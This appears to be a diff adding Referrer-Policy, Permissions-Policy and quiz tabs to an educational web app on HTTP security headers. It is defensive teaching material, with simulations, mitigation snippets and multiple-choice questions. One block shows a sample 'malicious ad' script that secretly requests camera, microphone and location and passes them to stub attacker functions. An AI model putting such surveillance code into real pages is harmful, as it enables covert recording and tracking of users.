+                    <button class="btn btn-primary" onclick="showTab('refpol')" style="font-size: 0.9rem;">Continue →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- REFERRER-POLICY TAB CONTENT-->
+    <div id="refpol" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🔗</span>
+                <h2 class="section-title">Understanding Referrer Policy</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Controls how much information about the previous page (the "referrer") your browser sends when users click links or load resources. By default, browsers send the full URL of where users came from.
+                    <br>What's a referrer? When you click a link from Page A to Page B, Page B can see that you came from Page A.
+                    <br>Referrer Policy lets you control whether to send the full URL, just the domain, or nothing at all.
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without proper referrer policy, sensitive information in URLs (like session tokens, user IDs, or private page paths) can leak to external websites when users click outbound links.
+                    <br>This can expose user activity, private content, and security tokens to third parties who shouldn't have access to this information.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            Referrer-Policy: strict-origin-when-cross-origin</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🏥</span>
+                <h2 class="section-title">Real-World Scenario: Healthcare Patient Portal</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine <strong>HealthSecure</strong> is a patient portal where people access medical records, lab results, and appointment schedules. The URLs often contain sensitive patient identifiers and medical information.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>Patients log in to view their medical records at URLs like: healthsecure.com/patient/12345/records?session=abc123&test-results=blood-work-2024. The portal includes links to external pharmacy websites and health information resources.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: Referrer Information Leakage</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive referrer leakage simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                A patient is viewing their sensitive medical records and clicks a link to an external pharmacy website to check medication prices. Without proper referrer policy, the pharmacy site can see exactly which medical page the patient came from.
+                <br><br>What the patient sees:
+                
+                <div class="code-block" data-label="Patient's Current Page" style="margin-top: 20px; text-align: left;">
+                🏥 https://healthsecure.com/patient/12345/records?session=abc123&results=hiv-test-positive&doc=dr-smith
+                <br>
+                Patient clicks: "Check Drug Prices at PharmacyDeals.com"
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666;">
+                What the external pharmacy website receives without referrer policy protection:
+                </p>
+
+                <div class="code-block" data-label="Information Leaked to External Site" style="margin-top: 20px; text-align: left;">
+                📊 Referrer Header Received by PharmacyDeals.com:
+                <br>Referer: https://healthsecure.com/patient/12345/records?session=abc123&results=hiv-test-positive&doc=dr-smith
+                <br><br>Notice in the URL above, parameters like:
+                <br>session=123 OR results=hiv-test-positive
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                ❌ Because of this, the external site now knows:
+                <br>• Patient ID (12345)
+                <br>• Session token (abc123)  
+                <br>• Medical test results (hiv-test-positive)
+                <br>• Doctor name (dr-smith)
+                
+                <br><br>Our demo below simulates what information gets leaked when clicking external links.
+                </p>
+            </p>
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">🔗 External Link Click Simulation</h3>
+                
+                <div class="upload-simulator" id="refpolArea">
+                    <div class="file-icon">🏥</div>
+                    <h4>Patient Medical Records Page</h4>
+                    <p style="color: #666; margin-top: 10px;">Currently viewing: patient/12345/records?session=abc123&results=hiv-test-positive</p>
+                    
+                    <div class="code-block" data-label="External Link on Medical Page" style="margin-top: 20px; text-align: left;">
+                    <pre>
+                    &lt;a href="https://pharmacy-deals.com/hiv-medications" target="_blank"&gt;
+                    💊 Check HIV Medication Prices
+                    &lt;/a&gt;
+                    
+                    &lt;!-- Without Referrer Policy, full URL leaked --&gt;
+                    &lt;!-- With Referrer Policy, only domain or nothing sent --&gt;</pre>
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="clickLinkBtn" onclick="simulateReferrerLeak()">
+                        💊 Check HIV Medication Prices  (External Link on Patient Portal)
+                    </button>
+                    <button class="btn btn-danger" id="disableRefPolBtn" onclick="toggleReferrerProtection(false)" disabled>
+                        ⚠️ Disable Referrer Protection
+                    </button>
+                    <button class="btn btn-primary" id="enableRefPolBtn" onclick="toggleReferrerProtection(true)">
+                        🛡️ Enable Referrer Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="refpolStatus">
+                    <span id="refpolStatusIcon">🚨</span>
+                    <span id="refpolStatusText">Referrer-Policy: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="refpolResultBox">
+                    Click the external link to see what referrer information gets leaked...
+                </div>
+
+                <div class="technical-details" id="refpolTechnicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="refpolTechnicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                Referrer information leakage can expose sensitive data across many types of websites:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>🏥 Medical Privacy Violations</h5>
+                    <p>Leak patient IDs, medical conditions, test results, and treatment information to external websites and advertisers.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔐 Session Token Exposure</h5>
+                    <p>Accidentally share authentication tokens and session IDs that could be used for account takeover attacks.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📊 User Tracking</h5>
+                    <p>Enable cross-site tracking of user behavior, browsing patterns, and personal interests without consent.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>💼 Corporate Espionage</h5>
+                    <p>Expose internal URLs, project names, employee information, and confidential business data to competitors.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🎯 Targeted Attacks</h5>
+                    <p>Provide attackers with detailed information about user activities to craft personalized phishing and social engineering attacks.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>⚖️ Compliance Violations</h5>
+                    <p>Violate GDPR, HIPAA, and other privacy regulations leading to massive fines and legal consequences.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Basic Referrer Policy</h5>
+                        <div class="code-block" data-label="Recommended Policy">
+                        Referrer-Policy: strict-origin-when-cross-origin</div>
+                        
+                        <div class="code-block" data-label="Express.js Implementation">
+                        app.use((req, res, next) => {
+                        res.setHeader('Referrer-Policy', 
+                            'strict-origin-when-cross-origin');
+                        next();
+                        });</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Strict Privacy Policy</h5>
+                        <div class="code-block" data-label="Maximum Privacy">
+                        Referrer-Policy: no-referrer</div>
+                        
+                        <div class="code-block" data-label="HTML Meta Tag">
+                        &lt;meta name="referrer" 
+                                content="strict-origin-when-cross-origin"&gt;</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Use 'strict-origin-when-cross-origin' for balanced security and functionality</li>
+                        <li>✅ Consider 'no-referrer' for maximum privacy on sensitive sites</li>
+                        <li>✅ Test external links to ensure they still work properly</li>
+                        <li>✅ Avoid putting sensitive data in URLs when possible</li>
+                        <li>✅ Review analytics to understand impact on referrer data</li>
+                        <li>✅ Document policy choice for compliance audits</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">➡️</span>
+                <h2 class="section-title">Keep Learning and Move Onto the Next Header</h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🎛️ Permissions-Policy</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">See how browsers expose powerful features, and learn how this header lets you shut down what's not needed, before it's abused.</p>
+                    <button class="btn btn-primary" onclick="showTab('permpol')" style="font-size: 0.9rem;">Continue →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- PERMISSIONS-POLICY TAB CONTENT-->
+    <div id="permpol" class="tab-content">
+        <!-- Header Explanation -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🎛️</span>
+                <h2 class="section-title">Understanding Permissions Policy</h2>
+            </div>
+            
+            <div class="intro-grid">
+                <div class="info-card">
+                    <h4>🎯 What It Does</h4>
+                    <p>Controls which browser features and APIs your website and embedded content can access. Think of it as a permission system for web features like camera, microphone, geolocation, and notifications.
+                    <br>What are browser APIs? These are features like accessing your camera for video calls, your microphone for voice messages, or your location for maps.
+                    <br>Permissions Policy lets you say "this page can use camera" or "third-party ads cannot access microphone."
+                    <br>This is different from when a browser gives you a pop up such as, "Allow this site to access your camera". This policy can prevent access entirely, even before the browser asks the user.
+                    </p>
+                </div>
+                <div class="info-card">
+                    <h4>⚠️ The Risk</h4>
+                    <p>Without Permissions Policy, malicious scripts or compromised third-party content can secretly access sensitive device features like your camera, microphone, or location without clear user consent.
+                    <br>Attackers can use these permissions for surveillance, data collection, or privacy violations that users never intended to allow.
+                    </p>
+                </div>
+            </div>
+
+            <div class="code-block" data-label="HTTP Response Header">
+            Permissions-Policy: camera=(), microphone=(), geolocation=(self)</div>
+        </div>
+
+        <!-- Real-World Scenario -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">📰</span>
+                <h2 class="section-title">Real-World Scenario: News Website with Ads</h2>
+            </div>
+            
+            <p style="margin-bottom: 20px; color: #666; font-size: 1.1rem;">
+                Imagine <strong>TrustedNews</strong> is a popular news website that displays articles alongside third-party advertisements and social media widgets. The site legitimately uses location for local weather and news, but wants to prevent ads from accessing sensitive features.
+            </p>
+
+            <div class="info-card">
+                <h4>🎯 Legitimate Use Case</h4>
+                <p>The main news site uses geolocation to show local weather and regional news. Video articles may use autoplay for news clips. The site should control which third-party content can access these powerful browser features.</p>
+            </div>
+        </div>
+
+        <!-- Attack Scenario -->
+        <div class="section interactive-section">
+            <div class="section-header">
+                <span class="section-icon">🎭</span>
+                <h2 class="section-title">Interactive Demo: Malicious Ad Feature Abuse</h2>
+            </div>
+
+            <div class="interactive-badge">
+                <span class="interactive-icon">🎮</span>
+                <span>Try the interactive permissions abuse simulation below</span>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                A user visits TrustedNews to read an article about local events. The page contains a malicious advertisement that attempts to secretly access the user's camera and microphone for surveillance purposes.
+                <br><br>What the user sees:
+                
+                <div class="code-block" data-label="Legitimate News Page" style="margin-top: 20px; text-align: left;">
+                <pre>
+                📰 TrustedNews.com - "Local Festival This Weekend"
+                
+                [News Article Content]
+                [Weather Widget] - Uses geolocation legitimately
+                [Advertisement Area] - Contains malicious ad script</pre>
+                </div>
+                
+                <p style="margin-bottom: 20px; color: #666;">
+                What the malicious advertisement tries to do:
+                </p>
+
+                <div class="code-block" data-label="Hidden Malicious Ad Code" style="margin-top: 20px; text-align: left;">
+                <pre>
+                &lt;!-- Malicious ad script --&gt;
+                &lt;script&gt;
+                // Secretly attempt surveillance
+                navigator.mediaDevices.getUserMedia({video: true, audio: true})
+                    .then(stream =&gt; {
+                    // Stream video/audio to attacker's server
+                    sendToAttacker(stream);
+                    });
+                    
+                // Track precise location
+                navigator.geolocation.getCurrentPosition(pos =&gt; {
+                    // Send GPS coordinates to ad network
+                    trackUser(pos.coords);
+                });
+                &lt;/script&gt;</pre>
+                </div>
+
+                <p style="margin-bottom: 20px; color: #666;">
+                Our demo simulates what happens when third-party content tries to access sensitive browser features.
+                </p>
+            </p>
+
+            <div class="demo-container">
+                <h3 style="margin-bottom: 20px; color: #333;">📺 Third-Party Ad Simulation</h3>
+                
+                <div class="upload-simulator" id="permpolArea">
+                    <div class="file-icon">📰</div>
+                    <h4>News Article with Advertisement</h4>
+                    <p style="color: #666; margin-top: 10px;">Reading: "Local Festival This Weekend" - Ad attempting to access device features</p>
+                    
+                    <div class="code-block" data-label="Permissions Requested by Ad" style="margin-top: 20px; text-align: left;">
+                    <pre>
+                    🎥 Camera Access: "For enhanced ad experience"
+                    🎤 Microphone Access: "For voice-activated ads"  
+                    📍 Precise Location: "For hyper-local targeting"
+                    🔊 Autoplay Audio: "For video advertisements"
+                    
+                    // Ad script attempts access without clear user consent</pre>
+                    </div>
+                </div>
+
+                <div class="controls">
+                    <button class="btn btn-danger" id="loadAdBtn" onclick="simulatePermissionsAbuse()">
+                        📰 Load Page with Malicious Ad
+                    </button>
+                    <button class="btn btn-danger" id="disablePermPolBtn" onclick="togglePermissionsProtection(false)" disabled>
+                        ⚠️ Disable Permissions Protection
+                    </button>
+                    <button class="btn btn-primary" id="enablePermPolBtn" onclick="togglePermissionsProtection(true)">
+                        🛡️ Enable Permissions Protection
+                    </button>
+                </div>
+
+                <div class="status-indicator" id="permpolStatus">
+                    <span id="permpolStatusIcon">🚨</span>
+                    <span id="permpolStatusText">Permissions-Policy: DISABLED (Vulnerable)</span>
+                </div>
+
+                <div class="result-box result-info" id="permpolResultBox">
+                    Click "Load Page" to see what happens when ads try to access device features...
+                </div>
+
+                <div class="technical-details" id="permpolTechnicalDetails" style="display: none;">
+                    <p class="technical-explanation" id="permpolTechnicalExplanation">
+                        <!-- Technical details will be populated by JavaScript -->
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Impact Analysis -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">💥</span>
+                <h2 class="section-title">Real-World Impact</h2>
+            </div>
+
+            <p style="margin-bottom: 20px; color: #666;">
+                Uncontrolled permissions access can lead to serious privacy violations and security breaches:
+            </p>
+
+            <div class="impact-grid">
+                <div class="impact-card">
+                    <h5>🎥 Secret Surveillance</h5>
+                    <p>Malicious ads or widgets secretly activate cameras and microphones to record users without their knowledge or consent.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>📍 Location Stalking</h5>
+                    <p>Precise GPS tracking by unauthorized third parties for stalking, burglary planning, or invasive behavioral profiling.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔋 Battery Drain Attacks</h5>
+                    <p>Cryptocurrency mining or resource-intensive operations running without permission, draining device battery and performance.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🔔 Notification Spam</h5>
+                    <p>Unauthorized push notifications for scams, malware distribution, and unwanted marketing that persists even after leaving the site.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>🎵 Audio Hijacking</h5>
+                    <p>Hijack device audio to play malware installation sounds, fake system alerts, or disrupt user activities.</p>
+                </div>
+                <div class="impact-card">
+                    <h5>⚖️ Privacy Law Violations</h5>
+                    <p>Violate GDPR, CCPA, and other privacy regulations leading to lawsuits and regulatory penalties for unauthorized data collection.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mitigation -->
+        <div class="section">
+            <div class="mitigation-section">
+                <h4><span>🛡️</span> How to Protect Your Application</h4>
+                <div style="color:gray; font-size:small"> The examples below are just sample implementations. Modify these or create your own to fit your organization</div>
+                
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-top: 20px;">
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Restrictive Policy</h5>
+                        <div class="code-block" data-label="Block Third-Party Access">
+                        Permissions-Policy: camera=(), microphone=(), 
+                        geolocation=(self), autoplay=(self)</div>
+                        
+                        <div class="code-block" data-label="Express.js Implementation">
+                        app.use((req, res, next) => {
+                        res.setHeader('Permissions-Policy', 
+                            'camera=(), microphone=(), geolocation=(self)');
+                        next();
+                        });</div>
+                    </div>
+                    
+                    <div>
+                        <h5 style="color: #27ae60; margin-bottom: 10px;">Selective Permissions</h5>
+                        <div class="code-block" data-label="Allow Trusted Domains">
+                        Permissions-Policy: camera=(self "https://trusted-video.com"), 
+                        microphone=(self), geolocation=()</div>
+                        
+                        <div class="code-block" data-label="HTML Implementation">
+                        &lt;iframe src="https://ads.com" 
+                                allow="geolocation 'none'; camera 'none'"&gt;
+                        &lt;/iframe&gt;</div>
+                    </div>
+                </div>
+
+                <div style="background: white; padding: 20px; border-radius: 8px; margin-top: 20px;">
+                    <h5 style="color: #333; margin-bottom: 15px;">📋 Security Checklist</h5>
+                    <ul style="color: #666; line-height: 2;">
+                        <li>✅ Deny sensitive permissions like camera/microphone to third parties by default</li>
+                        <li>✅ Only allow geolocation to your own domain unless specifically needed</li>
+                        <li>✅ Control autoplay to prevent resource abuse and user annoyance</li>
+                        <li>✅ Test iframe content to ensure permissions work as intended</li>
+                        <li>✅ Regularly audit third-party content for permission requirements</li>
+                        <li>✅ Document permission grants for compliance and security reviews</li>
+                    </ul>
+                </div>
+            </div>
+        </div>        
+        <!-- Learning Path Section -->
+        <div class="section">
+            <div class="section-header">
+                <span class="section-icon">🧠</span>
+                <h2 class="section-title">You've been given a lot of information. Let's see if any of it stuck, try this quiz!</q></h2>
+            </div>
+
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px;">
+                <div style="background: linear-gradient(135deg, #f8f9ff 0%, #e8f4fd 100%); padding: 20px; border-radius: 10px; border: 2px solid #667eea;">
+                    <h4 style="color: #667eea; margin-bottom: 10px;">🎓 Quiz</h4>
+                    <p style="color: #666; font-size: 0.9rem; margin-bottom: 15px;">Test what you’ve learned, challenge what you think you know, and see how well you can spot the risks before they strike.</p>
+                    <button class="btn btn-primary" onclick="showTab('quiz')" style="font-size: 0.9rem;">Try the Quiz →</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+<!-- QUIZ TAB CONTENT-->
+        <div id="quiz" class="tab-content">
+            <div class="section">
+                <div class="section-header">
+                    <span class="section-icon">🎓</span>
+                    <h2 class="section-title">Security Headers Knowledge Quiz</h2>
+                </div>
+                
+                <p style="font-size: 1.1rem; color: #555; margin-bottom: 30px; text-align: center;">
+                    Test your understanding of the security headers you've learned. Choose the best answer for each question.
+                </p>
+
+                <div class="quiz-container">
+                    <form id="quizForm">
+                        <!-- Question 1 -->
+                        <div class="quiz-question">
+                            <h4>1. An attacker uploads a file called "report.txt" containing malicious JavaScript. When users open this file in their browser, the script executes and steals their cookies. Which header would prevent this attack?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q1" value="csp"> Content-Security-Policy</label>
+                                <label><input type="radio" name="q1" value="xcto"> X-Content-Type-Options</label>
+                                <label><input type="radio" name="q1" value="xfo"> X-Frame-Options</label>
+                                <label><input type="radio" name="q1" value="hsts"> Strict-Transport-Security</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback1" style="display: none;"></div>
+                        </div>
+
+                        <!-- Question 2 -->
+                        <div class="quiz-question">
+                            <h4>2. A user connects to a coffee shop's WiFi and tries to visit their bank's website. An attacker intercepts the connection and downgrades it from HTTPS to HTTP to steal login credentials. Which header prevents this attack?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q2" value="refpol"> Referrer-Policy</label>
+                                <label><input type="radio" name="q2" value="hsts"> Strict-Transport-Security</label>
+                                <label><input type="radio" name="q2" value="permpol"> Permissions-Policy</label>
+                                <label><input type="radio" name="q2" value="csp"> Content-Security-Policy</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback2" style="display: none;"></div>
+                        </div>
+
+                        <!-- Question 3 -->
+                        <div class="quiz-question">
+                            <h4>3. A malicious website embeds a bank's transfer page invisibly over a fake "Win $1000!" button. Users think they're claiming a prize but actually transfer money to the attacker. Which header stops this?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q3" value="xcto"> X-Content-Type-Options</label>
+                                <label><input type="radio" name="q3" value="xfo"> X-Frame-Options</label>
+                                <label><input type="radio" name="q3" value="refpol"> Referrer-Policy</label>
+                                <label><input type="radio" name="q3" value="permpol"> Permissions-Policy</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback3" style="display: none;"></div>
+                        </div>
+
+                        <!-- Question 4 -->
+                        <div class="quiz-question">
+                            <h4>4. A patient views their medical records and clicks a link to a pharmacy website. The pharmacy receives the full URL including the patient's ID and medical test results. Which header would protect this sensitive information?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q4" value="hsts"> Strict-Transport-Security</label>
+                                <label><input type="radio" name="q4" value="csp"> Content-Security-Policy</label>
+                                <label><input type="radio" name="q4" value="refpol"> Referrer-Policy</label>
+                                <label><input type="radio" name="q4" value="xfo"> X-Frame-Options</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback4" style="display: none;"></div>
+                        </div>
+
+                        <!-- Question 5 -->
+                        <div class="quiz-question">
+                            <h4>5. An e-commerce site allows user reviews. An attacker submits a review containing malicious JavaScript that steals other users' payment information when they view the product page. Which header provides the best defense?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q5" value="permpol"> Permissions-Policy</label>
+                                <label><input type="radio" name="q5" value="xcto"> X-Content-Type-Options</label>
+                                <label><input type="radio" name="q5" value="csp"> Content-Security-Policy</label>
+                                <label><input type="radio" name="q5" value="hsts"> Strict-Transport-Security</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback5" style="display: none;"></div>
+                        </div>
+
+                        <!-- Question 6 -->
+                        <div class="quiz-question">
+                            <h4>6. A news website displays third-party advertisements. One of the ads secretly activates the user's camera and microphone to record them without permission. Which header would prevent this surveillance?</h4>
+                            <div class="quiz-options">
+                                <label><input type="radio" name="q6" value="refpol"> Referrer-Policy</label>
+                                <label><input type="radio" name="q6" value="xfo"> X-Frame-Options</label>
+                                <label><input type="radio" name="q6" value="permpol"> Permissions-Policy</label>
+                                <label><input type="radio" name="q6" value="xcto"> X-Content-Type-Options</label>
+                            </div>
+                            <div class="quiz-feedback" id="feedback6" style="display: none;"></div>
+                        </div>
+
+                        <!-- Quiz Controls -->
+                        <div class="quiz-controls">
+                            <button type="button" class="btn btn-primary" onclick="submitQuiz()">📊 Submit Quiz</button>
+                            <button type="button" class="btn btn-secondary" onclick="resetQuiz()" style="display: none;" id="resetBtn">🔄 Take Quiz Again</button>
+                        </div>
+
+                        <!-- Quiz Results -->
+                        <div class="quiz-results" id="quizResults" style="display: none;">
+                            <h3 id="scoreDisplay"></h3>
+                            <div id="scoreMessage"></div>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+</div>
     <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
